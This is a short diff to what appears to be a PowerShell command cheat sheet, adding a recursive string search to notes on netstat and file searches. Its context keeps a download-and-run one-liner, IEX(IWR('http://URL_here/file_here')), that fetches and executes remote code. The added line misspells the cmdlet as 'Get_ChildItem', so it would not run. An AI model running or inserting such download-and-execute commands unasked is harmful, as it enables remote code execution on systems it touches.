@@ -2238,6 +2238,9 @@ netstat -anbo | Select-String service_name_here -Context 1
 # search for a file
 Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File
 
+# search for string in files in current directory + sub folders
+Get_ChildItem . -Recurse | Select-String "string_here"
+
 # download file from web server + run it 
 IEX(IWR('http://URL_here/file_here'))
 Invoke-WebRequest -Uri http://IP_here/path/to/file -OutFile /path/to/outfile
